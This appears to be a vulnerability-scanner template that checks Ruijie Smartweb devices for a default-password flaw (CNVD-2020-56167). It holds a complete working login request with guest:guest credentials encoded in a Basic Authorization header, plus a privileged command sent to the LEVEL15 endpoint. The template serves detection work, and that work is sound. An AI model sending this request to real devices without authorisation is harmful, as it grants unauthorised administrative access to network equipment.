id: CNVD-2020-56167
brief:
    title: Ruijie Smartweb - Default Password
    by: pikpikcu
    level: low
    about: Ruijie Smartweb contains a vulnerability via the default password. An attacker can successfully bypass entering required credentials, thus possibly obtain sensitive information from a database, mod...
    label:
        - cnvd
        - cnvd2020
        - ruijie
        - default-login
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/WEB_VMS/LEVEL15/'
      head:
        Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
      body: command=show basic-info dev&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
      signs:
        - "on": word
          has:
            - 'Level was: LEVEL15'
            - /WEB_VMS/LEVEL15/
          in: body
          need: all
        - "on": status
          status:
            - 200
